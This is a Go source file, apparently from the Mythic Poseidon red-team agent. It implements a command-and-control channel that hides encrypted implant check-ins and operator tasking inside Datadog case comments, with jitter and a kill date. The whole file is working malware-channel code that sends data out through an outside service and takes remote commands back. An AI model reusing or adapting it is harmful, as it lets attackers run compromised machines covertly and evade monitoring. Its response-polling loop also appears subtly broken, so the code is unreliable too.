//go:build (linux || darwin) && datadog

package profiles

import (
	"bytes"
	"context"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var CaseStatusClosed = "CLOSED"
var CaseStatusOpen = "OPEN"
var CaseStatusInProgress = "IN_PROGRESS"
var CaseStatusGroupOpen = "SG_OPEN"
var CasePriorityNotDefined = "NOT_DEFINED"
var CasePriorityP5 = "P5"
var CaseTypeCase = "case"
var CaseTimelinePageSize = 100
var ProjectResourceType = "project"
var SortFieldCreatedAt = "created_at"
var TimelineTypeComment = "COMMENT"
var validProjectCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
var ProjectsRoute = "/api/v2/cases/projects"
var CasesRoute = "/api/v2/cases"
var ApiSuffix = "datadoghq.com"
var defaultRequestTimeout = 30 * time.Second
var maxRateLimitRetries = 8
var maxErrorBodyCharacters = 2000
var CommentMaxLength = 20000
var maxRateLimitDelay = 30 * time.Second

var datadog_initial_config string

type DatadogInitialConfig struct {
	Region                 string `json:"region"`
	ApiKey                 string `json:"api_key"`
	AppKey                 string `json:"app_key"`
	Killdate               string `json:"killdate"`
	EncryptedExchangeCheck bool   `json:"encrypted_exchange_check"`
	Jitter                 uint   `json:"callback_jitter"`
	AESPSK                 string `json:"AESPSK"`
	Interval               uint   `json:"callback_interval"`
}

type C2Datadog struct {
	apiClient             *DatadogClient
	Interval              int
	Jitter                int
	ExchangingKeys        bool
	Key                   string
	RsaPrivateKey         *rsa.PrivateKey
	Killdate              time.Time
	ShouldStop            bool
	stoppedChannel        chan bool
	interruptSleepChannel chan bool
}

type DatadogClient struct {
	Region        string
	ApiKey        string
	AppKey        string
	ProjectId     string
	HTTPClient    *http.Client
	RateLimitWait func(context.Context, time.Duration) error
}

type Meta struct {
	Page struct {
		Current int `json:"current,omitempty"`
		Size    int `json:"size,omitempty"`
		Total   int `json:"total,omitempty"`
	} `json:"page:omitempty"`
}

type CasesResponse struct {
	Data []Case `json:"data,omitempty"`
	Meta Meta   `json:"meta,omitempty"`
}

type CaseResponse struct {
	Data *Case `json:"data,omitempty"`
}

type LinkResponse struct {
	Data []Link `json:"data,omitempty"`
}

type Link struct {
	Id         string `json:"id"`
	Type       string `json:"type"`
	Attributes struct {
		ChildEntityId    string `json:"child_entity_id"`
		ChildEntityType  string `json:"child_entity_type"`
		ParentEntityId   string `json:"parent_entity_id"`
		ParentEntityType string `json:"parent_entity_type"`
		Relationship     string `json:"relationship"`
	} `json:"attributes"`
}

type Case struct {
	ID            string             `json:"id,omitempty"`
	Type          string             `json:"type,omitempty"`
	Attributes    CaseAttributes     `json:"attributes,omitempty"`
	Relationships *CaseRelationships `json:"relationships,omitempty"`
}

type Project struct {
	ID         string `json:"id,omitempty"`
	Attributes struct {
		Name string `json:"name,omitempty"`
		Key  string `json:"key,omitempty"`
	} `json:"attributes,omitempty"`
	Type string `json:"type,omitempty"`
}

type CaseAttributes struct {
	CreatedAt   time.Time `json:"created_at,omitempty"`
	Description string    `json:"description,omitempty"`
	Status      string    `json:"status,omitempty"`
	StatusGroup string    `json:"status_group,omitempty"`
	StatusName  string    `json:"status_name,omitempty"`
	Title       string    `json:"title,omitempty"`
	Priority    string    `json:"priority,omitempty"`
	TypeID      string    `json:"type_id,omitempty"`
}

type CaseRelationships struct {
	Project *ProjectRelationship `json:"project,omitempty"`
}

type ProjectRelationship struct {
	Data ProjectRelationshipData `json:"data"`
}

type ProjectRelationshipData struct {
	ID   string `json:"id"`
	Type string `json:"type"`
}

func projectRelationship(projectID string) ProjectRelationship {
	return ProjectRelationship{
		Data: ProjectRelationshipData{
			ID:   projectID,
			Type: ProjectResourceType,
		},
	}
}

type TimelineResponse struct {
	Data []TimelineCellResource `json:"data,omitempty"`
}

type TimelineCellResource struct {
	ID         string       `json:"id,omitempty"`
	Type       string       `json:"type,omitempty"`
	Attributes TimelineCell `json:"attributes,omitempty"`
}

type TimelineCell struct {
	Type        *string              `json:"type,omitempty"`
	CellContent *TimelineCellContent `json:"cell_content,omitempty"`
}

type TimelineCellContent struct {
	Message *string `json:"message,omitempty"`
}

type APIError struct {
	Status string
	Body   string
}

func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(datadog_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial datadog config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := DatadogInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial datadog config, exiting: %v\n", err))
		os.Exit(1)
	}
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := C2Datadog{
		apiClient:             newDatadogClient(initialConfig.Region, initialConfig.ApiKey, initialConfig.AppKey),
		Key:                   initialConfig.AESPSK,
		Killdate:              killDateTime,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		interruptSleepChannel: make(chan bool, 1),
	}

	// Convert sleep from string to integer
	profile.Interval = int(initialConfig.Interval)
	if profile.Interval < 0 {
		profile.Interval = 0
	}

	// Convert jitter from string to integer
	profile.Jitter = int(initialConfig.Jitter)
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck

	RegisterAvailableC2Profile(&profile)
}

func (c *C2Datadog) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}

func (c *C2Datadog) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2Datadog) GetSleepInterval() int {
	return c.Interval
}
func (c *C2Datadog) GetSleepJitter() int {
	return c.Jitter
}
func (c *C2Datadog) GetKillDate() time.Time {
	return c.Killdate
}

func (c *C2Datadog) GetPushChannel() chan structs.MythicMessage {
	return nil
}

func (c *C2Datadog) ProfileName() string {
	return "datadog"
}

func (c *C2Datadog) IsP2P() bool {
	return false
}

func (c *C2Datadog) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2Datadog) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}

func (c *C2Datadog) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *C2Datadog) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "AppKey":
		c.apiClient.AppKey = value
	case "ApiKey":
		c.apiClient.ApiKey = value
	case "Region":
		c.apiClient.Region = value
	case "EncryptionKey":
		c.Key = value
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	}
}

func (c *C2Datadog) Sleep() {
	// wait for either sleep time duration or sleep interrupt
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(GetSleepTime())):
	}
}

func (c *C2Datadog) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2Datadog) SendMessage(sendData []byte) []byte {
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data: %v\n", string(sendData))
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	//fmt.Printf("Sending: %v\n", string(sendData))
	sendDataBase64 := base64.StdEncoding.EncodeToString(sendData) // Base64 encode and convert to raw bytes
	//utils.PrintDebug(string(sendDataBase64))

	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
		return []byte{}
	}

	today := time.Now()
	if today.After(c.Killdate) {
		utils.PrintDebug(fmt.Sprintf("after killdate, exiting\n"))
		os.Exit(1)
	}
	//create project if one doesn't exist for us yet
	if c.apiClient.ProjectId == "" {
		projectId, err := c.apiClient.createProject(context.Background(), UUID)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Error creating new project: %s", err.Error()))
			return nil
		}
		c.apiClient.ProjectId = projectId
	}
	// Create Case and do status, write, priority
	caseId, err := c.apiClient.writeCase(context.Background(), sendDataBase64)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error failed to write message to case: %v\n", err))
		return make([]byte, 0)
	}

	var childCaseId = ""
	var i int
	for i = 0; i < 5; i++ {
		c.Sleep()
		childCaseId, err = c.apiClient.getChildCase(context.Background(), caseId)
		if err == nil && childCaseId != "" {
			continue
		}
	}
	if (i >= 5) || (childCaseId == "") {
		utils.PrintDebug(fmt.Sprintf("error failed to find response after %d attempts: %v", i, err))
		return make([]byte, 0)
	}
	messages, _, err := c.apiClient.getCaseCommentMessages(context.Background(), childCaseId)

	raw, err := base64.StdEncoding.DecodeString(strings.Join(messages, ""))

	if len(c.Key) != 0 {
		//log.Println("just did a post, and decrypting the message back")
		enc_raw := c.decryptMessage(raw[36:])
		if len(enc_raw) == 0 {
			// failed somehow in decryption
			utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
		} else {
			return enc_raw
		}
	} else {
		return raw[36:]
	}

	utils.PrintDebug(fmt.Sprintf("Aborting sending message"))
	return make([]byte, 0) //shouldn't get here
}

// NegotiateKey - EKE key negotiation
func (c *C2Datadog) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw)
	// Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
		return false
	}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}

// CheckIn a new agent
func (c *C2Datadog) CheckIn() structs.CheckInMessageResponse {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
			//fmt.Printf("trying to negotiate key\n")
			if c.ShouldStop {
				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
				return structs.CheckInMessageResponse{}
			}
		}
	}
	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
			return structs.CheckInMessageResponse{}
		}
		checkin := CreateCheckinMessage()
		if raw, err := json.Marshal(checkin); err != nil {
			c.Sleep()
			continue
		} else {
			resp := c.SendMessage(raw)

			// save the Mythic id
			response := structs.CheckInMessageResponse{}
			if err = json.Unmarshal(resp, &response); err != nil {
				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
				c.Sleep()
				continue
			}
			if len(response.ID) != 0 {
				SetMythicID(response.ID)
				SetAllEncryptionKeys(c.Key)
				return response
			} else {
				c.Sleep()
				continue
			}
		}

	}

}

func (c *C2Datadog) Start() {
	// Checkin with Mythic via an egress channel
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	defer func() {
		c.stoppedChannel <- true
	}()
	for {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
			return
		}
		checkIn := c.CheckIn()
		// If we successfully checkin, get our new ID and start looping
		if strings.Contains(checkIn.Status, "success") {
			for {
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
					return
				}
				// loop through all task responses
				message := responses.CreateMythicPollMessage()
				if encResponse, err := json.Marshal(message); err == nil {
					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
					resp := c.SendMessage(encResponse)
					if len(resp) > 0 {
						//fmt.Printf("Raw resp: \n %s\n", string(resp))
						taskResp := structs.MythicMessageResponse{}
						if err := json.Unmarshal(resp, &taskResp); err != nil {
							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
							c.Sleep()
							continue
						}
						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
					}
				} else {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
				}
				c.Sleep()
			}
		} else {
			//fmt.Printf("Uh oh, failed to checkin\n")
		}
	}

}

func (c *C2Datadog) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	utils.PrintDebug("issued stop to http\n")
	<-c.stoppedChannel
	utils.PrintDebug("http fully stopped\n")
}

func (c *C2Datadog) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Datadog) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}

func newDatadogClient(region string, apiKey string, appKey string) *DatadogClient {
	return &DatadogClient{
		Region: region,
		ApiKey: apiKey,
		AppKey: appKey,
		HTTPClient: &http.Client{
			Timeout: defaultRequestTimeout,
		},
	}
}

func (c *DatadogClient) writeCase(ctx context.Context, data string) (string, error) {
	title := fmt.Sprintf("msg_%d", time.Now().Unix())
	caseId, _, err := c.createCase(ctx, title, "00000000-0000-0000-0000-000000000001", c.ProjectId)
	if err != nil {
		return caseId, err
	}
	chunkedData := chunkData(data)
	for _, chunk := range chunkedData {
		_, err := c.commentCase(ctx, caseId, c.ProjectId, chunk)
		if err != nil {
			return caseId, err
		}
	}
	// P5 marks write complete
	_, err = c.updateCasePriority(ctx, caseId, CasePriorityP5)
	if err != nil {
		return caseId, err
	}
	return caseId, nil
}

func (c *DatadogClient) createProject(ctx context.Context, name string) (string, error) {
	body := struct {
		Data struct {
			Attributes struct {
				Name string `json:"name"`
				Key  string `json:"key"`
			} `json:"attributes"`
			Type string `json:"type"`
		} `json:"data"`
	}{}
	body.Data.Attributes.Name = name
	b := make([]byte, 10)
	for i := range b {
		b[i] = validProjectCharacters[time.Now().UnixNano()%int64(len(validProjectCharacters))]
	}
	keyName := string(b)
	body.Data.Attributes.Key = keyName
	body.Data.Type = ProjectResourceType

	var projectResponse struct {
		Data struct {
			ID string `json:"id"`
		} `json:"data"`
	}

	_, err := c.do(ctx, http.MethodPost, ProjectsRoute, nil, body, &projectResponse)
	if err != nil {
		return "", err
	}
	return projectResponse.Data.ID, nil
}

func (c *DatadogClient) getChildCase(ctx context.Context, parentCaseId string) (string, error) {
	queryParams := url.Values{}
	queryParams.Set("entity_type", "CASE")
	queryParams.Set("entity_id", parentCaseId)

	var linkResponse LinkResponse
	_, err := c.do(ctx, http.MethodGet, "/api/v2/cases/link", queryParams, nil, &linkResponse)
	if err != nil {
		return "", err
	}
	if len(linkResponse.Data) < 1 {
		return "", fmt.Errorf("No links for caseId:%v \n", parentCaseId)
	}
	return linkResponse.Data[0].Attributes.ChildEntityId, nil

}

func (c *DatadogClient) updateCasePriority(ctx context.Context, caseId string, priority string) (*http.Response, error) {
	body := struct {
		Data struct {
			Attributes struct {
				Priority string `json:"priority"`
			} `json:"attributes"`
			Type string `json:"type"`
		} `json:"data"`
	}{}
	body.Data.Attributes.Priority = priority
	body.Data.Type = CaseTypeCase

	return c.do(ctx, http.MethodPost, "/api/v2/cases/"+url.PathEscape(caseId)+"/priority", nil, body, nil)
}

func chunkData(data string) []string {
	commentCount := 1
	if len(data) > 0 {
		commentCount = (len(data) + CommentMaxLength - 1) / CommentMaxLength
	}

	comments := make([]string, 0, commentCount)
	for index := 0; index < commentCount; index++ {
		start := index * CommentMaxLength
		end := start + CommentMaxLength
		if end > len(data) {
			end = len(data)
		}

		chunkData := ""
		if start < len(data) {
			chunkData = data[start:end]
		}
		comments = append(comments, string(chunkData))
	}
	return comments
}

func (c *DatadogClient) createCase(ctx context.Context, title string, typeID string, projectID string) (string, *http.Response, error) {
	body := struct {
		Data struct {
			Attributes struct {
				Description string `json:"description"`
				Priority    string `json:"priority"`
				Title       string `json:"title"`
				TypeID      string `json:"type_id"`
				StatusName  string `json:"status_name"`
			} `json:"attributes"`
			Relationships struct {
				Project ProjectRelationship `json:"project"`
			} `json:"relationships"`
			Type string `json:"type"`
		} `json:"data"`
	}{}
	body.Data.Attributes.Priority = CasePriorityNotDefined
	body.Data.Attributes.Title = title
	body.Data.Attributes.TypeID = typeID
	body.Data.Attributes.StatusName = "In Progress"
	body.Data.Relationships.Project = projectRelationship(projectID)
	body.Data.Type = CaseTypeCase

	var caseResponse CaseResponse
	fmt.Printf("%+v\n", body)
	response, err := c.do(ctx, http.MethodPost, "/api/v2/cases", nil, body, &caseResponse)
	if err != nil {
		return "", response, err
	}
	if caseResponse.Data == nil || caseResponse.Data.ID == "" {
		return "", response, fmt.Errorf("create case response did not include a case id")
	}
	return caseResponse.Data.ID, response, nil
}

func (c *DatadogClient) commentCase(ctx context.Context, caseID string, projectID string, message string) (*http.Response, error) {
	body := struct {
		Data struct {
			Attributes struct {
				Comment string `json:"comment"`
			} `json:"attributes"`
			Relationships struct {
				Project ProjectRelationship `json:"project"`
			} `json:"relationships"`
			Type string `json:"type"`
		} `json:"data"`
	}{}
	body.Data.Attributes.Comment = message
	body.Data.Relationships.Project = projectRelationship(projectID)
	body.Data.Type = CaseTypeCase

	return c.do(ctx, http.MethodPost, "/api/v2/cases/"+url.PathEscape(caseID)+"/comment", nil, body, nil)
}

func (c *DatadogClient) closeCase(ctx context.Context, caseID string, projectID string) (*http.Response, error) {
	body := struct {
		Data struct {
			Attributes struct {
				Status string `json:"status"`
			} `json:"attributes"`
			Relationships struct {
				Project ProjectRelationship `json:"project"`
			} `json:"relationships"`
			Type string `json:"type"`
		} `json:"data"`
	}{}
	body.Data.Attributes.Status = CaseStatusClosed
	body.Data.Relationships.Project = projectRelationship(projectID)
	body.Data.Type = CaseTypeCase

	return c.do(ctx, http.MethodPost, "/api/v2/cases/"+url.PathEscape(caseID)+"/status", nil, body, nil)
}

func timelineCommentMessages(timeline TimelineResponse) []string {
	messages := []string{}
	for _, cell := range timeline.Data {
		cellAttributes := cell.Attributes
		if cellAttributes.Type != nil && !strings.EqualFold(*cellAttributes.Type, TimelineTypeComment) {
			continue
		}
		if cellAttributes.CellContent == nil || cellAttributes.CellContent.Message == nil {
			continue
		}

		message := strings.TrimSpace(*cellAttributes.CellContent.Message)
		if message != "" {
			messages = append(messages, message)
		}
	}
	return messages
}

func (d *DatadogClient) getCaseCommentMessages(ctx context.Context, caseID string) ([]string, *http.Response, error) {
	messages := []string{}
	var lastHTTPResponse *http.Response
	for pageNumber := 0; ; pageNumber++ {
		timeline, httpResponse, err := d.getCaseTimeline(ctx, caseID, pageNumber, CaseTimelinePageSize)
		lastHTTPResponse = httpResponse
		if err != nil {
			return nil, httpResponse, err
		}

		messages = append(messages, timelineCommentMessages(timeline)...)
		if len(timeline.Data) < CaseTimelinePageSize {
			return messages, lastHTTPResponse, nil
		}
	}
}

// Get comments in chronological order (oldest) first.  created_at serves as chunk index.
func (c *DatadogClient) getCaseTimeline(ctx context.Context, caseID string, pageNumber int, pageSize int) (TimelineResponse, *http.Response, error) {
	query := url.Values{}
	query.Set("page[size]", fmt.Sprint(pageSize))
	query.Set("page[number]", fmt.Sprint(pageNumber))
	query.Set("sort[ascending]", "true")

	var timeline TimelineResponse
	response, err := c.do(ctx, http.MethodGet, "/api/v2/cases/"+url.PathEscape(caseID)+"/timelines", query, nil, &timeline)
	return timeline, response, err
}

func (err APIError) Error() string {
	body := strings.TrimSpace(err.Body)
	if body == "" {
		return err.Status
	}
	if len(body) > maxErrorBodyCharacters {
		body = body[:maxErrorBodyCharacters] + "..."
	}
	return fmt.Sprintf("%s: %s", err.Status, body)
}

func (c *DatadogClient) do(ctx context.Context, method string, path string, query url.Values, body interface{}, output interface{}) (*http.Response, error) {
	requestURL := c.baseURL() + path
	if len(query) > 0 {
		requestURL += "?" + query.Encode()
	}

	var encodedBody []byte
	var err error
	if body != nil {
		encodedBody, err = json.Marshal(body)
		if err != nil {
			return nil, err
		}
	}

	for attempt := 0; ; attempt++ {
		var requestBody io.Reader
		if encodedBody != nil {
			requestBody = bytes.NewReader(encodedBody)
		}

		request, err := http.NewRequestWithContext(ctx, method, requestURL, requestBody)
		if err != nil {
			return nil, err
		}
		request.Header.Set("Accept", "application/json")
		request.Header.Set("DD-API-KEY", c.ApiKey)
		request.Header.Set("DD-APPLICATION-KEY", c.AppKey)
		if body != nil {
			request.Header.Set("Content-Type", "application/json")
		}

		response, err := c.httpClient().Do(request)
		if err != nil {
			return response, err
		}

		responseBody, readErr := io.ReadAll(response.Body)
		_ = response.Body.Close()
		if readErr != nil {
			return response, readErr
		}

		if response.StatusCode == http.StatusTooManyRequests && attempt < maxRateLimitRetries {
			if err := c.waitRateLimit(ctx, rateLimitDelay(response, attempt)); err != nil {
				return response, err
			}
			continue
		}

		if response.StatusCode >= 300 {
			return response, APIError{Status: response.Status, Body: string(responseBody)}
		}
		if output == nil || len(responseBody) == 0 {
			return response, nil
		}
		if err := json.Unmarshal(responseBody, output); err != nil {
			return response, err
		}
		return response, nil
	}
}

func (c *DatadogClient) baseURL() string {
	region := strings.TrimSpace(c.Region)
	baseUrl := "https://"
	switch region {
	case "us1":
		baseUrl = baseUrl + "api." + ApiSuffix
	case "eu1":
		baseUrl = baseUrl + "api.datadoghq.eu"
	default:
		baseUrl = baseUrl + "api." + region + "." + ApiSuffix
	}
	return baseUrl
}

func (c *DatadogClient) httpClient() *http.Client {
	if c.HTTPClient != nil {
		return c.HTTPClient
	}
	return &http.Client{Timeout: defaultRequestTimeout}
}

func (c *DatadogClient) waitRateLimit(ctx context.Context, delay time.Duration) error {
	if c.RateLimitWait != nil {
		return c.RateLimitWait(ctx, delay)
	}
	return sleepContext(ctx, delay)
}

func rateLimitDelay(response *http.Response, attempt int) time.Duration {
	if delay := secondsHeaderDelay(response.Header.Get("Retry-After")); delay > 0 {
		return delay
	}
	if delay := secondsHeaderDelay(response.Header.Get("X-RateLimit-Reset")); delay > 0 {
		return delay
	}

	delay := time.Duration(1<<attempt) * time.Second
	if delay > maxRateLimitDelay {
		return maxRateLimitDelay
	}
	return delay
}

func secondsHeaderDelay(value string) time.Duration {
	value = strings.TrimSpace(value)
	if value == "" {
		return 0
	}
	seconds, err := strconv.Atoi(value)
	if err != nil || seconds <= 0 {
		return 0
	}
	return time.Duration(seconds) * time.Second
}

func sleepContext(ctx context.Context, delay time.Duration) error {
	if delay <= 0 {
		return nil
	}
	timer := time.NewTimer(delay)
	defer timer.Stop()

	select {
	case <-timer.C:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}
